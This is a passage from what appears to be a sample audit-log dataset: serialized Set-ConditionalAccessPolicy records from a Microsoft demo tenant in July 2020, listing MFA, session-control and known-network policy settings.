'{\\\"Version\\\":0,\\\"State\\\":\\\"Disabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"All\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]},\\\"DevicePlatforms\\\":{\\\"Include\\\":[{\\\"DevicePlatforms\\\":[\\\"All\\\"]}],\\\"Exclude\\\":[{\\\"DevicePlatforms\\\":[\\\"macOS\\\"]}]}},\\\"Controls\\\":[{\\\"Control\\\":[\\\"Mfa\\\"]}],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false}', 'PolicyLastUpdatedTime': '7/4/2020 4:58:34 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Megan MFA demo', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\b2915792-0396-4abe-94ec-e17fa17243c5', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"94c63fef-13a3-47bc-8074-75af8c65887a\\\",\\\"c9a559d2-7aab-4f13-a6ed-e7e9c52aec87\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"bdb72692-2275-412b-8af0-ea21c2ebd174\\\",\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]},\\\"SignInRisks\\\":{\\\"Include\\\":[{\\\"SignInRisks\\\":[\\\"High\\\",\\\"Medium\\\",\\\"Low\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":3}', 'PolicyLastUpdatedTime': '7/5/2020 2:09:01 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'GBB demo', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\5fd0c4ff-1cd7-4bf6-8607-294a04f58f12', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Disabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"All\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"142512c7-f006-46ae-909c-14fa7bf6a887\\\"]}]}},\\\"Controls\\\":[{\\\"Control\\\":[\\\"Mfa\\\"]}],\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false}', 'PolicyLastUpdatedTime': '7/5/2020 2:09:01 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Azure MFA', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\2e76d011-eaa3-40b4-8ce8-7fba52bf3af8', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Reporting\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"f9e8b3d0-ba26-42cd-b544-c90a66191a81\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"All\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":1}', 'PolicyLastUpdatedTime': '7/5/2020 5:05:51 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'On-Prem SharePoint - MeganB proxy', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\2e76d011-eaa3-40b4-8ce8-7fba52bf3af8', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Reporting\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"f9e8b3d0-ba26-42cd-b544-c90a66191a81\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"All\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":1}', 'PolicyLastUpdatedTime': '7/5/2020 5:05:51 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'On-Prem SharePoint - MeganB proxy', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\3b13ea3c-c733-4eb8-bd19-67d308b2ea04', 'PolicyDetails': '{\\\"Version\\\":0,\\\"CreatedDateTime\\\":\\\"2020-05-19T13:34:15.2394934Z\\\",\\\"ModifiedDateTime\\\":\\\"2020-05-19T13:39:04.7333386Z\\\",\\\"State\\\":\\\"Reporting\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"None\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"Guests\\\"]}]},\\\"DevicePlatforms\\\":{\\\"Include\\\":[{\\\"DevicePlatforms\\\":[\\\"All\\\"]}],\\\"Exclude\\\":[{\\\"DevicePlatforms\\\":[\\\"Android\\\",\\\"iOS\\\",\\\"macOS\\\"]}]},\\\"ClientTypes\\\":{\\\"Include\\\":[{\\\"ClientTypes\\\":[\\\"Browser\\\",\\\"Native\\\"]}]}},\\\"Controls\\\":[{\\\"Control\\\":[\\\"Mfa\\\",\\\"RequireCompliantDevice\\\"]}]}', 'PolicyLastUpdatedTime': '7/6/2020 1:42:07 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Yanivsh -CA Test', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\8837fdaa-aaeb-4432-9622-43f6f583d583', 'PolicyDetails': '{\\\"KnownNetworkPolicies\\\":{\\\"NetworkName\\\":\\\"BE-Office\\\",\\\"NetworkId\\\":\\\"b98b9088-ce88-4fae-80fb-5b58cb1ce685\\\",\\\"CidrIpRanges\\\":[\\\"109.88.218.99/28\\\"],\\\"CountryIsoCodes\\\":null,\\\"Categories\\\":[],\\\"ApplyToUnknownCountry\\\":false}}', 'PolicyLastUpdatedTime': '7/6/2020 1:42:07 AM', 'TenantDefaultPolicy': '6', 'DisplayName': 'Known Networks List', 'PolicyIdentifierString': '3/19/2020 7:45:08 PM'})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\6490d00c-7ba1-42cf-aa88-99eb71d53bf7', 'PolicyDetails': '{\\\"Version\\\":0,\\\"LastUpdatedTimestamp\\\":\\\"2020-07-02T12:42:35.1866847Z\\\",\\\"State\\\":\\\"Disabled\\\",\\\"SignInFrequency\\\":\\\"NotSet\\\",\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\"}', 'PolicyLastUpdatedTime': '7/6/2020 4:29:48 AM', 'TenantDefaultPolicy': '18', 'DisplayName': 'Default Policy', 'PolicyIdentifierString': '5/19/2020 1:39:05 PM'})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\69c7a12f-b407-45a3-b07e-fa04fc7f273d', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"00000003-0000-0ff1-ce00-000000000000\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"All\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":1}', 'PolicyLastUpdatedTime': '7/6/2020 4:29:48 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Test Policy', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\83a057fb-dbca-4ba8-bb5f-0ce6d6e7cff5', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Acrs\\\":[\\\"urn:microsoft:req1\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]}},\\\"Controls\\\":[{\\\"Control\\\":[\\\"Mfa\\\"]}],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false}', 'PolicyLastUpdatedTime': '7/7/2020 1:51:17 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'MeganB MCAS Step-up', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\5fd0c4ff-1cd7-4bf6-8607-294a04f58f12', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Disabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"All\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"142512c7-f006-46ae-909c-14fa7bf6a887\\\"]}]}},\\\"Controls\\\":[{\\\"Control\\\":[\\\"Mfa\\\"]}],\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false}', 'PolicyLastUpdatedTime': '7/7/2020 1:51:18 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Azure MFA', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\8837fdaa-aaeb-4432-9622-43f6f583d583', 'PolicyDetails': '{\\\"KnownNetworkPolicies\\\":{\\\"NetworkName\\\":\\\"BE-Office\\\",\\\"NetworkId\\\":\\\"b98b9088-ce88-4fae-80fb-5b58cb1ce685\\\",\\\"CidrIpRanges\\\":[\\\"109.88.218.99/28\\\"],\\\"CountryIsoCodes\\\":null,\\\"Categories\\\":[],\\\"ApplyToUnknownCountry\\\":false}}', 'PolicyLastUpdatedTime': '7/8/2020 2:30:51 AM', 'TenantDefaultPolicy': '6', 'DisplayName': 'Known Networks List', 'PolicyIdentifierString': '3/19/2020 7:45:08 PM'})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\8837fdaa-aaeb-4432-9622-43f6f583d583', 'PolicyDetails': '{\\\"KnownNetworkPolicies\\\":{\\\"NetworkName\\\":\\\"BE-Office\\\",\\\"NetworkId\\\":\\\"b98b9088-ce88-4fae-80fb-5b58cb1ce685\\\",\\\"CidrIpRanges\\\":[\\\"109.88.218.99/28\\\"],\\\"CountryIsoCodes\\\":null,\\\"Categories\\\":[],\\\"ApplyToUnknownCountry\\\":false}}', 'PolicyLastUpdatedTime': '7/8/2020 2:30:51 AM', 'TenantDefaultPolicy': '6', 'DisplayName': 'Known Networks List', 'PolicyIdentifierString': '3/19/2020 7:45:08 PM'})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\e183bd29-a3a3-4f91-a5a3-b83b21a544df', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"00000002-0000-0ff1-ce00-000000000000\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"2935e535-8fdf-4217-865b-e084cb7214f1\\\"]}]}},\\\"SessionControls\\\":[\\\"AppEnforcedRestrictions\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false}', 'PolicyLastUpdatedTime': '7/8/2020 4:57:43 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'JulianI Exchange native controls', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\83a057fb-dbca-4ba8-bb5f-0ce6d6e7cff5', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Acrs\\\":[\\\"urn:microsoft:req1\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]}},\\\"Controls\\\":[{\\\"Control\\\":[\\\"Mfa\\\"]}],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false}', 'PolicyLastUpdatedTime': '7/8/2020 4:57:42 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'MeganB MCAS Step-up', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\235bec94-f744-48ac-8314-5675953d2def', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Disabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"All\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]},\\\"DevicePlatforms\\\":{\\\"Include\\\":[{\\\"DevicePlatforms\\\":[\\\"All\\\"]}],\\\"Exclude\\\":[{\\\"DevicePlatforms\\\":[\\\"macOS\\\"]}]}},\\\"Controls\\\":[{\\\"Control\\\":[\\\"Mfa\\\"]}],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false}', 'PolicyLastUpdatedTime': '7/9/2020 2:37:12 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Megan MFA demo', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\2e76d011-eaa3-40b4-8ce8-7fba52bf3af8', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Reporting\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"f9e8b3d0-ba26-42cd-b544-c90a66191a81\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"All\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":1}', 'PolicyLastUpdatedTime': '7/9/2020 2:37:14 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'On-Prem SharePoint - MeganB proxy', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\ba36f0a4-6d73-4ba4-9282-3b3c14575e36', 'PolicyDetails': '{\\\"Version\\\":0,\\\"ModifiedDateTime\\\":\\\"2020-05-19T13:31:41.7083504Z\\\",\\\"State\\\":\\\"Disabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"00000002-0000-0ff1-ce00-000000000000\\\",\\\"00000003-0000-0ff1-ce00-000000000000\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"2935e535-8fdf-4217-865b-e084cb7214f1\\\"]}]},\\\"DevicePlatforms\\\":{\\\"Include\\\":[{\\\"DevicePlatforms\\\":[\\\"All\\\"]}],\\\"Exclude\\\":[{\\\"DevicePlatforms\\\":[\\\"Android\\\",\\\"iOS\\\",\\\"macOS\\\"]}]},\\\"ClientTypes\\\":{\\\"Include\\\":[{\\\"ClientTypes\\\":[\\\"Browser\\\",\\\"Native\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"CasSessionControlType\\\":1}', 'PolicyLastUpdatedTime': '7/10/2020 2:47:08 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Block Access JulianI', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\4c5a5ea0-5d9f-4730-baaa-7a69cf29ef26', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"All\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"bdb72692-2275-412b-8af0-ea21c2ebd174\\\"]}]}},\\\"Controls\\\":[{\\\"Control\\\":[\\\"Mfa\\\"]}],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false}', 'PolicyLastUpdatedTime': '7/10/2020 2:47:08 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Semolen - Admin MFA', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\ba36f0a4-6d73-4ba4-9282-3b3c14575e36', 'PolicyDetails': '{\\\"Version\\\":0,\\\"ModifiedDateTime\\\":\\\"2020-05-19T13:31:41.7083504Z\\\",\\\"State\\\":\\\"Disabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"00000002-0000-0ff1-ce00-000000000000\\\",\\\"00000003-0000-0ff1-ce00-000000000000\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"2935e535-8fdf-4217-865b-e084cb7214f1\\\"]}]},\\\"DevicePlatforms\\\":{\\\"Include\\\":[{\\\"DevicePlatforms\\\":[\\\"All\\\"]}],\\\"Exclude\\\":[{\\\"DevicePlatforms\\\":[\\\"Android\\\",\\\"iOS\\\",\\\"macOS\\\"]}]},\\\"ClientTypes\\\":{\\\"Include\\\":[{\\\"ClientTypes\\\":[\\\"Browser\\\",\\\"Native\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"CasSessionControlType\\\":1}', 'PolicyLastUpdatedTime': '7/10/2020 5:29:23 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Block Access JulianI', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\2e76d011-eaa3-40b4-8ce8-7fba52bf3af8', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Reporting\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"f9e8b3d0-ba26-42cd-b544-c90a66191a81\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"All\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":1}', 'PolicyLastUpdatedTime': '7/10/2020 5:29:22 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'On-Prem SharePoint - MeganB proxy', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\8872f6fb-da88-4b63-bcc7-17247669596b', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"00000002-0000-0ff1-ce00-000000000000\\\",\\\"09abbdfd-ed23-44ee-a2d9-a627aa1c90f3\\\",\\\"cc15fd57-2c6c-4117-a88c-83b1d56b4bbe\\\",\\\"00000003-0000-0ff1-ce00-000000000000\\\",\\\"00000005-0000-0ff1-ce00-000000000000\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":1}', 'PolicyLastUpdatedTime': '7/11/2020 2:21:22 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'MeganB MCAS Proxy', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\3b13ea3c-c733-4eb8-bd19-67d308b2ea04', 'PolicyDetails': '{\\\"Version\\\":0,\\\"CreatedDateTime\\\":\\\"2020-05-19T13:34:15.2394934Z\\\",\\\"ModifiedDateTime\\\":\\\"2020-05-19T13:39:04.7333386Z\\\",\\\"State\\\":\\\"Reporting\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"None\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"Guests\\\"]}]},\\\"DevicePlatforms\\\":{\\\"Include\\\":[{\\\"DevicePlatforms\\\":[\\\"All\\\"]}],\\\"Exclude\\\":[{\\\"DevicePlatforms\\\":[\\\"Android\\\",\\\"iOS\\\",\\\"macOS\\\"]}]},\\\"ClientTypes\\\":{\\\"Include\\\":[{\\\"ClientTypes\\\":[\\\"Browser\\\",\\\"Native\\\"]}]}},\\\"Controls\\\":[{\\\"Control\\\":[\\\"Mfa\\\",\\\"RequireCompliantDevice\\\"]}]}', 'PolicyLastUpdatedTime': '7/11/2020 2:21:26 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Yanivsh -CA Test', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\6490d00c-7ba1-42cf-aa88-99eb71d53bf7', 'PolicyDetails': '{\\\"Version\\\":0,\\\"LastUpdatedTimestamp\\\":\\\"2020-07-02T12:42:35.1866847Z\\\",\\\"State\\\":\\\"Disabled\\\",\\\"SignInFrequency\\\":\\\"NotSet\\\",\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\"}', 'PolicyLastUpdatedTime': '7/11/2020 5:03:43 AM', 'TenantDefaultPolicy': '18', 'DisplayName': 'Default Policy', 'PolicyIdentifierString': '5/19/2020 1:39:05 PM'})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\e183bd29-a3a3-4f91-a5a3-b83b21a544df', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"00000002-0000-0ff1-ce00-000000000000\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"2935e535-8fdf-4217-865b-e084cb7214f1\\\"]}]}},\\\"SessionControls\\\":[\\\"AppEnforcedRestrictions\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false}', 'PolicyLastUpdatedTime': '7/11/2020 5:03:44 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'JulianI Exchange native controls', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\69c7a12f-b407-45a3-b07e-fa04fc7f273d', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"00000003-0000-0ff1-ce00-000000000000\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"All\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":1}', 'PolicyLastUpdatedTime': '7/11/2020 5:03:43 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Test Policy', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\bcd93f74-64fd-4042-a3ae-ee6d48886d6d', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"c9a559d2-7aab-4f13-a6ed-e7e9c52aec87\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"bdb72692-2275-412b-8af0-ea21c2ebd174\\\",\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":3}', 'PolicyLastUpdatedTime': '7/11/2020 5:03:41 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Form MCAS', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\e183bd29-a3a3-4f91-a5a3-b83b21a544df', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"00000002-0000-0ff1-ce00-000000000000\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"2935e535-8fdf-4217-865b-e084cb7214f1\\\"]}]}},\\\"SessionControls\\\":[\\\"AppEnforcedRestrictions\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false}', 'PolicyLastUpdatedTime': '7/12/2020 2:47:24 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'JulianI Exchange native controls', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\83a057fb-dbca-4ba8-bb5f-0ce6d6e7cff5', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Acrs\\\":[\\\"urn:microsoft:req1\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]}},\\\"Controls\\\":[{\\\"Control\\\":[\\\"Mfa\\\"]}],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false}', 'PolicyLastUpdatedTime': '7/12/2020 2:47:24 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'MeganB MCAS Step-up', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\e183bd29-a3a3-4f91-a5a3-b83b21a544df', 'PolicyDetails': 